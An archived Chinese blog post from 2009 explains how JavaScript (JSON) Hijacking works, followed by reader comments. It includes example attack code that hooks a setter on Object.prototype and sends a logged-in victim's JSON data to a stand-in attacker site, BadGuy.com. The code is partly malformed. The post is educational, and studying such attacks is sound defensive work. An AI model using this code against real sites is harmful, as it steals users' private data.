<link rel="preload" href="./20190721JSHijacking_files/f.txt" as="script"><script type="text/javascript" src="./20190721JSHijacking_files/f.txt"></script><script src="./20190721JSHijacking_files/pubads_impl_2019070801.js.下载" async=""></script><link rel="prefetch" href="https://tpc.googlesyndication.com/safeframe/1-0-35/html/container.html"></head>
<body>
<a name="top"></a>



<div id="container">
    <a class="minyx" href="http://www.cnblogs.com/">代码改变世界</a>
    <ul id="topMnu">
        <!-- 统计数据 -->
        <li>
            
                <div id="blog_stats">
Posts - 94, 
Articles - 54, 
Comments - 768
<!----></div>
            
        </li>
        <!-- 这边可以增加一些链接 -->
        <!-- 博客园 -->
        <li><a href="http://www.cnblogs.com/">Cnblogs</a></li>
        <!-- 管理 -->
        <li id="topMnu-dashboard">
            <a id="lnkDashboard" href="https://www.cnblogs.com/hyddd/admin/EditPosts.aspx">Dashboard</a></li>
        <li>
            <a id="lnkLogin" href="http://passport.cnblogs.com/login.aspx?ReturnUrl=http://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm">Login</a></li>
    </ul>

    <script type="text/javascript">
        var m = window.__blog.topMenuRendered;
        if (m) { m(__$("topMnu")); }
    </script>

    <div id="header">
        <ul id="menu">
            <!-- 首页，当前section加上current类 -->
            <li id="menu-home" class="current">
                <a id="lnkHome" href="https://www.cnblogs.com/hyddd/">Home</a></li>
            <!-- 联系 -->
            <li id="menu-contact">
                <a id="lnkContact" href="http://space.cnblogs.com/msg/send/hyddd">Contact</a></li>
            <!-- 相册 -->
            <li id="menu-gallary">
                <a id="lnkGallery" href="https://www.cnblogs.com/hyddd/gallery.html">Gallery</a></li>
            <!-- Rss订阅 -->
            <li id="rss">
                <a id="lnkRss" href="https://www.cnblogs.com/hyddd/rss">RSS</a></li>
        </ul>
        <div id="newmsg"></div>
        <h1>
            <!-- 主标题 -->
            <a id="lnkBlogTitle" href="https://www.cnblogs.com/hyddd/">hyddd</a>
            <!-- 子标题 -->
            <small>
                知行合一</small>
        </h1>
    </div>

    <script type="text/javascript">
        var m = window.__blog.headerRendered;
        if (m) { m(__$("header")); }
    </script>

    <div id="wrapper">
        <div id="content">
            <script type="text/javascript">
                var m = window.__blog.preRenderPosts;
                if (m) { m(); }
            </script>
            
        <div id="post_detail">
<div class="post" id="post">
    <a name="top"></a>
    <h2><a id="cb_post_title_url" href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html">深入理解JavaScript Hijacking原理</a></h2>
    <small>2009-07-02 18:45 by hyddd, <span id="post_view_count">14821</span> 阅读, <span id="post_comment_count">28</span> 评论, <a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#" onclick="AddToWz(1515768);return false;">收藏</a>,  <a href="https://i.cnblogs.com/EditPosts.aspx?postid=1515768" rel="nofollow">编辑</a></small>
    <div class="entry">
        <div id="cnblogs_post_body" class="blogpost-body"><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 最近在整理关于JavaScript代码安全方面的资料，在查关于JavaScript Hijacking的资料时，发现关于它的中文资料很少，故特意整理一下。</p>
<p><span style="font-size: large;">一.JavaScript Hijacking原理</span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其实JavaScript Hijacking和CSRF攻击的思想很类似，关于CSRF攻击可以参考我之前写的《<a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a>》，关于JavaScript Hijacking的攻击模型，见下图：</p>
<p><img src="./20190721JSHijacking_files/2009070218500674.jpg"></p>
<p>（1）.你正常访问信任站点（<a href="http://www.bank.com/">http://www.Bank.com</a>），然后登陆信任站点。</p>
<p>（2）.信任站点通过你的验证，并返回Cookie。</p>
<p>（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（<a href="http://www.badguy.com/">www.BadGuy.com</a>）。</p>
<p>（4）.恶意站点向请求用户访问<a href="http://www.bank.com/">http://www.Bank.com</a>的一个资源。</p>
<p>（5）.浏览器带着之前的Cookie信息，向信任站点<a href="http://www.bank.com/">http://www.Bank.com</a>发出了一个GET请求。</p>
<p>（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组（如果不清楚JSON，可以参考《<a href="https://www.cnblogs.com/hyddd/archive/2009/06/15/1503914.html">JSON入门指南</a>》）。</p>
<p>（7）.你的浏览器收到来自<a href="http://www.bank.com/">http://www.Bank.com</a>的响应后，转发响应中的JSON信息给恶意站点。</p>
<p>至此，恶意站点拿到你关于<a href="http://www.bank.com/">http://www.Bank.com</a>的信息。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 到这里，你应该有对JavaScript Hijacking有一个大概的概念，它确实和CSRF很相像，唯一不同的是，<b><span style="color: #ff0000;">CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息</span></b>。</p>
<p><b><span style="font-size: large;">二.JavaScript Hijacking攻击示范代码：</span></b></p>
<p>
<style type="text/css"><!--
.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #008000; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }
--></style>
</p>
<p>演示代码之前，首先明确几点：</p>
<p>（1）.恶意站点的攻击目标是明确的（这里目标就是<a href="http://www.bank.com/">http://www.Bank.com</a>）。</p>
<p>（2）.恶意站点是通过用户给它返回信任网站的JSON数组（为什么是JSON数组？普通的JSON对象不行么？这个下面会提到！），从而获取用户私隐信息的。也就是说所谓的隐私数据，也就是这些JSON数组里面的数据，所以信任站点返回的不是JSON数组的数据或者JSON里面的信息是垃圾信息，那么这个恶意站点是徒劳的。</p>
<p>（3）.恶意站点必须实先知道用户返回的JSON的结构。</p>
<p>（4）.恶意站点能且只能发送GET请求......</p>
<p>（5）.这种攻击是需要浏览器支持的，至于为什么看下面吧。</p>
<p>恩，下面看一下攻击代码吧:&gt;</p>
<p>这个恶意站点<a href="http://www.badguy.com/">www.BadGuy.com</a>针对<a href="http://www.bank.com/">www.Bank.com</a>的攻击代码：</p>
<pre class="csharpcode">&lt;script type=<span class="str">"text/javascript"</span>&gt;<br>Object.prototype.__defineSetter__(<span class="str">'money'</span>, <span class="kwrd">function</span>(obj) { var objString = "";  for (fld in this) {objString += fld + ": " + this[fld] + ", "; }  req.open("GET", "<a href="http://www.badguy.com/?obj=">http://www.BadGuy.com?obj=</a>" +escape(objString),true); } req.send(null); );<br>&lt;/script&gt;<br>&lt;script type=<span class="str">"text/javascript"</span> src=<span class="str">"http://www.Bank.com/UserInfo"</span>&gt;&lt;/script&gt;</pre>
<p>在用户访问恶意网站时：</p>
<pre class="csharpcode">&lt;script type=<span class="str">"text/javascript"</span> src=<span class="str">"http://www.Bank.com/UserInfo"</span>&gt;&lt;/script&gt;</pre>
<p>
<style type="text/css"><!--
.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #008000; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }
--></style>
</p>
<p>（1）.这段JS代码会要求浏览器发送一个GET请求到<a href="http://www.bank.com/UserInfo">http://www.Bank.com/UserInfo</a>，于是浏览器按照指示，带上本地的Cookie信息，发送一个http的GET请求。</p>
<p>（2）.<a href="http://www.bank.com/">www.Bank.Com</a>接受到请求后，确认身份后，响应请求返回了一个JSON数组/JavaScript代码段。</p>
<p>（3）.客户端接受到这段JS脚本后，如果返回的是一个JSON数组，比如：</p>
<pre class="csharpcode">[{<span class="str">"Id"</span>:3,<span class="str">"Name"</span>:hyddd,<span class="str">"Money"</span>:10000}]</pre>
<p>
<style type="text/css"><!--
.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #008000; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }
--></style>
</p>
<p>JSON数组被认为是一段可执行的JavaScript脚本，于是浏览器会解析执行。</p>
<p>如果返回的是一个JSON对象呢？</p>
<pre class="csharpcode">{<span class="str">"Id"</span>:3,<span class="str">"Name"</span>:hyddd,<span class="str">"Money"</span>:10000}</pre>
<p>
<style type="text/css"><!--
.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #008000; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }
--></style>
</p>
<p>呵呵，这个是不会被浏览器执行的，因为浏览器认为：它不是一个JavaScript脚本。</p>
<p>如果它返回的是一个JavaScript脚本的话，恩，这得具体问题具体分析了，不一定能拿到什么数据。</p>
<p>（4）.看下面这段JavaScript脚本：</p>
<pre class="csharpcode">&lt;script type=<span class="str">"text/javascript"</span>&gt;<br>Object.prototype.__defineSetter__(<span class="str">'Money'</span>, <span class="kwrd">function</span>(obj) { <span class="kwrd">var</span> objString = <span class="str">""</span>;  <span class="kwrd">for</span> (fld <span class="kwrd">in</span> <span class="kwrd">this</span>) {objString += fld + <span class="str">": "</span> + <span class="kwrd">this</span>[fld] + <span class="str">", "</span>; }  req.open(<span class="str">"GET"</span>, "<a href="http://www.badguy.com/?obj">http:<span class="rem">//www.BadGuy.com?obj</span></a>"= +escape(objString),true); } req.send(null); );<br>&lt;/script&gt;<br></pre>
<p>
<style type="text/css"><!--
.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #008000; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }
--></style>
</p>
<p>它的作用就是发送受害者的私隐信息到恶意站点的。</p>
<p>这里可能有人不理解，我大概说一下：</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Object.prototype.__defineSetter__，可以看做是JavaScript中的Hook（有人把这个称为<a href="http://www.yuanma.org/data/2007/1214/article_2924.htm">JavaScript函数劫持</a>，注意JavaScript的函数劫持和JavaScript Hijacking不是同一个概念，JavaScript Hijacking的核心思想和CSRF攻击的核心思想应该是一致的），这里是对Object的Money属性设置了一个Hook，在JavaScript中，由于其他的对象都是派生自Object的，所以这段代码就对所有对象的Money属性都做了一个Hook，当有对象设置它的Money属性时，都会触发上面这段代码的运行。注意的是：__defineSetter__这个在IE系列的浏览器好像是不受支持的（在IE6下试了不行），但FireFox系列的浏览器是肯定支持的。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 后面的var objString=""...这就是发送受害者信息到恶意站点了，这里不说了。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 当浏览器解析（3）中的JSON数组时，会新建一个对象并赋值，这时候就出发了上面这段代码，结果私隐信息就发送到恶意站点了。</p>
<p>&nbsp;</p>
<p><span style="word-spacing: 0px; font-family: Verdana; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14px; line-height: 21px; font-size-adjust: none; font-stretch: normal; text-transform: none; color: #000000; text-indent: 0px; white-space: normal; letter-spacing: normal; border-collapse: separate; orphans: 2; widows: 2;"><b>转载请说明出处，谢谢![hyddd(<a style="color: #0000ff; text-decoration: none;" href="https://www.cnblogs.com/hyddd/">http://www.cnblogs.com/hyddd/</a>)]</b></span></p>
<p><span style="font-size: large;"><b>参考资料</b></span>：</p>
<p>【1】Fortify的一篇Paper《JavaScript_Hijacking》，作者：B. Chess, Y. O'Neil, and J. West。</p>
<p>【2】《JSON Hijacking》，作者：Phil Haack </p></div><div id="MySignature" style="display: block;"><p style="border-bottom: rgb(128,128,128) thin solid; border-left: rgb(128,128,128) thin solid; padding-bottom: 10px; margin: auto; padding-left: 70px; padding-right: 10px; font-family: 微软雅黑;background: url(http://www.cnblogs.com/images/cnblogs_com/sun/228823/o_warning.png) rgb(204,204,204) no-repeat 1% 50%; border-top: rgb(128,128,128) thin solid; border-right: rgb(128,128,128) thin solid; padding-top: 10px; -moz-background-clip: border; -moz-background-origin: padding; -moz-background-inline-policy: continuous">作者：<a href="http://www.cnblogs.com/hyddd/" target="_blank">hyddd</a><br>出处：<a href="http://www.cnblogs.com/hyddd/" target="_blank">http://www.cnblogs.com/hyddd/</a><br>本文版权归作者所有，欢迎转载，演绎或用于商业目的，但是必须说明本文出处（包含链接）。</p></div>
        <div class="clear"></div>
        <div id="blog_post_info_block">
        <div id="blog_post_info"><div id="green_channel">
        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(1515768,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
            <a id="green_channel_follow" onclick="follow(&#39;9208470b-63cf-dd11-9e4d-001cf0cd104b&#39;);" href="javascript:void(0);">关注我</a>
    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./20190721JSHijacking_files/icon_weibo_24.png" alt=""></a>
    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./20190721JSHijacking_files/wechat.png" alt=""></a>
</div>
<div id="author_profile">
    <div id="author_profile_info" class="author_profile_info">
            <a href="https://home.cnblogs.com/u/hyddd/" target="_blank"><img src="./20190721JSHijacking_files/u46057.png" class="author_avatar" alt=""></a>
        <div id="author_profile_detail" class="author_profile_info">
            <a href="https://home.cnblogs.com/u/hyddd/">hyddd</a><br>
            <a href="https://home.cnblogs.com/u/hyddd/followees">关注 - 3</a><br>
            <a href="https://home.cnblogs.com/u/hyddd/followers">粉丝 - 1541</a>
        </div>
    </div>
    <div class="clear"></div>
    <div id="author_profile_honor"></div>
    <div id="author_profile_follow">
                <a href="javascript:void(0);" onclick="follow(&#39;9208470b-63cf-dd11-9e4d-001cf0cd104b&#39;);return false;">+加关注</a>
    </div>
</div>
<div id="div_digg">
    <div class="diggit" onclick="votePost(1515768,&#39;Digg&#39;)">
        <span class="diggnum" id="digg_count">1</span>
    </div>
    <div class="buryit" onclick="votePost(1515768,&#39;Bury&#39;)">
        <span class="burynum" id="bury_count">0</span>
    </div>
    <div class="clear"></div>
    <div class="diggword" id="digg_tips">
    </div>
</div>
<script type="text/javascript">
    currentDiggType = 0;
</script></div>
        <div class="clear"></div>
        <div id="post_next_prev"><a href="https://www.cnblogs.com/hyddd/archive/2009/06/26/1511799.html" class="p_n_p_prefix">« </a> 上一篇：<a href="https://www.cnblogs.com/hyddd/archive/2009/06/26/1511799.html" title="发布于2009-06-26 16:42">Dynamic Performance Tables not accessible, Automatic Statistics Disabled for this session【ZZ】</a><br><a href="https://www.cnblogs.com/hyddd/archive/2009/07/05/1517047.html" class="p_n_p_prefix">» </a> 下一篇：<a href="https://www.cnblogs.com/hyddd/archive/2009/07/05/1517047.html" title="发布于2009-07-05 02:26">Html的安全隐患</a><br></div>
    </div>
</div>
    <ul class="postmetadata">
        <li class="icon_cat" id="BlogPostCategory">分类: <a href="https://www.cnblogs.com/hyddd/category/168575.html" target="_blank">Security</a></li>
        <li class="icon_bullet" id="EntryTag">标签: <a href="https://www.cnblogs.com/hyddd/tag/Security/">Security</a>, <a href="https://www.cnblogs.com/hyddd/tag/JavaScript/">JavaScript</a></li>
    </ul>
</div>
<script type="text/javascript">var allowComments=true,cb_blogId=49647,cb_entryId=1515768,cb_blogApp=currentBlogApp,cb_blogUserGuid='9208470b-63cf-dd11-9e4d-001cf0cd104b',cb_entryCreatedDate='2009/7/2 18:45:00';loadViewCount(cb_entryId);var cb_postType=1;var isMarkdown=false;</script>
<script type="text/javascript">
    var m = window.__blog.postRendered;
    if (m) { m(__$("post")); }
</script>
<script type="text/javascript">
    var m = window.__blog.postRenderPosts;
    if (m) { m(); }
</script>
</div><a name="!comments"></a><div id="blog-comments-placeholder"><div id="comments_pager_top"></div>
<a class="addcomment" href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#comment_tip">Add your comment</a>
<h3 id="comments"></h3>
<div class="feedbackNoItems"></div>
<script language="javascript" type="text/javascript">
    var m = window.__blog.preRenderCommentList;
    if (m) { m(); }
</script>

<ol class="commentlist" id="commentList">	

		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574007" class="layer">#1楼</a><a name="1574007" id="comment_anchor_1574007"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574007" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 18:52</span></small>
			</h5>
			<div id="comment_body_1574007" class="blog_comment_body">如果有错误，请各位指出。:&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574007,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574007,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574007_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574011" class="layer">#2楼</a><a name="1574011" id="comment_anchor_1574011"></a></cite> <a id="a_comment_author_1574011" href="https://www.cnblogs.com/jimnox/" target="_blank">JimLiu</a> <a href="http://msg.cnblogs.com/send/JimLiu" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 18:54</span></small>
			</h5>
			<div id="comment_body_1574011" class="blog_comment_body">很棒的思路，劫持一个函数。<br>我曾经两次发现过校内网的漏洞，但是两次我都只想到了用跨站cookie来CSRF，现在我发现不用这么麻烦了，劫持一些重要的函数，用户的隐私就很容易被泄露。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574011,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574011,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574011_avatar" style="display:none;">http://pic.cnblogs.com/face/u35553.jpg</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574026" class="layer">#3楼</a><a name="1574026" id="comment_anchor_1574026"></a></cite> <a id="a_comment_author_1574026" href="https://www.cnblogs.com/JeffreyZhao/" target="_blank">Jeffrey Zhao</a> <a href="http://msg.cnblogs.com/send/Jeffrey%20Zhao" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 19:33</span></small>
			</h5>
			<div id="comment_body_1574026" class="blog_comment_body">真不错</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574026,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574026,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574026_avatar" style="display:none;">http://pic.cnblogs.com/face/u9419.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574033" class="layer">#4楼</a><a name="1574033" id="comment_anchor_1574033"></a></cite> <a id="ctl00_CommentList_NameLink_3" href="http://space.cnblogs.com/73459/" target="_blank">www.womian.com</a><small> <span class="comment_date">2009-07-02 19:48</span></small>
			</h5>
			<div id="comment_body_1574033" class="blog_comment_body"><a href="http://www.ninnd.com/" target="_new">http://www.ninnd.com</a> 试试cnblog的有没有</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574033,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574033,&#39;Bury&#39;,this)">反对(0)</a></div>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574039" class="layer">#5楼</a><a name="1574039" id="comment_anchor_1574039"></a></cite> <a id="a_comment_author_1574039" href="https://www.cnblogs.com/eclairs/" target="_blank">Fisher.W</a> <a href="http://msg.cnblogs.com/send/Fisher.W" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 20:07</span></small>
			</h5>
			<div id="comment_body_1574039" class="blog_comment_body">很不错，如果楼主能把对策也写出来就更好了……</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574039,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574039,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574039_avatar" style="display:none;">http://pic.cnblogs.com/face/u40152.jpg?id=11140513</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574046" class="layer">#6楼</a><a name="1574046" id="comment_anchor_1574046"></a></cite> <a id="a_comment_author_1574046" href="https://www.cnblogs.com/wenjl520/" target="_blank">温景良(Jason)</a> <a href="http://msg.cnblogs.com/send/%E6%B8%A9%E6%99%AF%E8%89%AF%28Jason%29" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 20:23</span></small>
			</h5>
			<div id="comment_body_1574046" class="blog_comment_body">不错</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574046,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574046,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574046_avatar" style="display:none;">http://pic.cnblogs.com/face/u33118.jpg</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574079" class="layer">#7楼</a><a name="1574079" id="comment_anchor_1574079"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574079" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 21:43</span></small>
			</h5>
			<div id="comment_body_1574079" class="blog_comment_body">@Jeffrey Zhao<br>得到老赵肯定，感觉真不错，哈:&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574079,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574079,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574079_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574080" class="layer">#8楼</a><a name="1574080" id="comment_anchor_1574080"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574080" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 21:43</span></small>
			</h5>
			<div id="comment_body_1574080" class="blog_comment_body">@JimLiu<br>@温景良(Jason)<br>:&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574080,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574080,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574080_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574081" class="layer">#9楼</a><a name="1574081" id="comment_anchor_1574081"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574081" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 21:44</span></small>
			</h5>
			<div id="comment_body_1574081" class="blog_comment_body">@eclairs fisher<br>相关资料在整理中。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574081,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574081,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574081_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574119" class="layer">#10楼</a><a name="1574119" id="comment_anchor_1574119"></a></cite> <a id="a_comment_author_1574119" href="https://www.cnblogs.com/inday/" target="_blank">James.Ying</a> <a href="http://msg.cnblogs.com/send/James.Ying" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-02 22:44</span></small>
			</h5>
			<div id="comment_body_1574119" class="blog_comment_body">有点像flash劫持，不过这个是利用了现在多窗口浏览器的特性，不错不错</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574119,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574119,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574119_avatar" style="display:none;">http://pic.cnblogs.com/face/u4871.gif</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574191" class="layer">#11楼</a><a name="1574191" id="comment_anchor_1574191"></a></cite> <a id="a_comment_author_1574191" href="https://www.cnblogs.com/Ivony/" target="_blank">Ivony...</a> <a href="http://msg.cnblogs.com/send/Ivony..." title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 03:00</span></small>
			</h5>
			<div id="comment_body_1574191" class="blog_comment_body">哎，最近JavaScript的跨站攻击技术真是日新月异了。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574191,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574191,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574191_avatar" style="display:none;">http://pic.cnblogs.com/face/u14218.jpg</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
